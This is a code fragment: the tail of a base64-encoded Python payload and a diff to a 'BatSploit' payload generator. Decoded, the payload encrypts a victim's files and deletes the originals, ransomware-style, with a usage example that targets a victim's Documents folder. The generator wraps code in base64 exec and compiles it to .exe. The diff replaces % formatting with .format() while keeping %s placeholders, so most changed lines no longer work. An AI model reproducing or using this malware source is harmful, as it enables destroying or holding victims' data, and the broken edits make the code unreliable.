iKSAjIGNyaWEgb3Mgbm92b3MgYXJxdWl2b3MgY3JpcHRvZ3JhZmFkb3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3X2ZpbGVzLndyaXRlKGVuY3J5cHQpICMgZXNjcmV2ZSBvcyBub3ZvcyBhcnF1aXZvcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVyLmNsb3NlKCkgIyBmZWNoYSBvcyBhcnF1aXZvcyBvcmlnaW5haXMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3X2ZpbGVzLmNsb3NlKCkgIyBmZWNoYSBvcyBub3ZvcyBhcnF1aXZvcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoZmxhZykgIyByZW1vdmUgb3MgYXJxdWl2b3Mgb3JpZ2luYWlzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KSAjIGVzcGVyYSAwLjUgc2VndW5kb3MsIHBhcmEgZGFyIG1haXMgZXN0YWJpbGlkYWRlIGFvIHByb2dyYW1hDQogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpICMgbGltYSBvIGNhY2hlDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgbmFtZV9zY3JpcHQgPSBzeXMuYXJndlswXS5zcGxpdCgiXFwiKSAjIG5vbWUgZG8gc2NyaXB0DQogICAgICAgICAgICAgICAgbmFtZSA9IG5hbWVfc2NyaXB0W2xlbihuYW1lX3NjcmlwdCkgLSAxXQ0KICAgICAgICAgICAgICAgIHByaW50ICJcblsrXSBVc2FnZSA6ICVzIHBhdGhfdG9fZW5jcnlwdCIlKG5hbWUpICMgYmFubmVyDQogICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBFeGFtcGxlIDogJXMgQzpcXFVzZXJzXFx2aWN0aW1cXERvY3VtZW50cyIlKG5hbWUpDQogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgICAgICAgICAgc3lzLmV4aXQoKQ0KZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgICAgICBwcmludCAiXG5bWF0gU2FpbmRvIC4uLiINCiAgICAgICAgc3lzLmV4aXQoKSAjIHNhaSBzZSBhcGVydGFyIEN0cmwrYw=="
@@ -543,7 +543,7 @@ class BatSploit(object):
 			quest_compile = raw_input("[?] Do you want compiling to .exe [Y/N] : ")
 			print "\n"
 			if quest_compile == "N" or quest_compile == "n":
-				payload_coded = "exec('%s').decode('base64')"%(code)
+				payload_coded = "exec('%s').decode('base64')".format(code)
 				payload_file = open(name, 'w') # abri o arquivo dst
 				payload_file.write(payload_coded)
 				payload_file.close() # fecha o arquivo
@@ -558,35 +558,35 @@ class BatSploit(object):
 				if not "usage:" in cmd_.read():
 					os.system("pip install pyinstaller")
 				else:
-					os.system("pyinstaller %s"%(name))
+					os.system("pyinstaller %s".format(name))
 					if self.platform == "Windows":
 						os.system("powershell rm -r build")
-						os.system("del %s.spec"%(name_of_payload))
-						os.system("cd dist/ && powershell mv %s ../compiled/"%(name_of_payload))
+						os.system("del %s.spec".format(name_of_payload))
+						os.system("cd dist/ && powershell mv %s ../compiled/".format(name_of_payload))
 						os.system("powershell rm -r dist")
 						os.system("cls")
 					elif self.platform == "Linux":
-						os.system("rm -r build && rm %s.spec && mv %s ../compiled/"%(name_of_payload, name_of_payload))
+						os.system("rm -r build && rm %s.spec && mv %s ../compiled/".format(name_of_payload, name_of_payload))
 						os.system("clear")
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
 			if quest_compile == "N" or quest_compile == "n":
-				sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+				sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			else:
-				sys.stdout.write(colored("Path : compiled/%s/%s.exe\n"%(name_of_payload,name_of_payload), "white"))
+				sys.stdout.write(colored("Path : compiled/%s/%s.exe\n".format(name_of_payload,name_of_payload), "white"))
 			if self.platform == "Windows":
 				if quest_compile == "N" or quest_compile == "n":
-					os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+					os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 				else:
-					os.system("del %s"%(name))
+					os.system("del %s".format(name))
 			elif self.platform == "Linux":
 				if quest_compile == "N" or quest_compile == "n":
-					os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+					os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 				else:
-					os.system("rm %s"%(name))
+					os.system("rm %s".format(name))
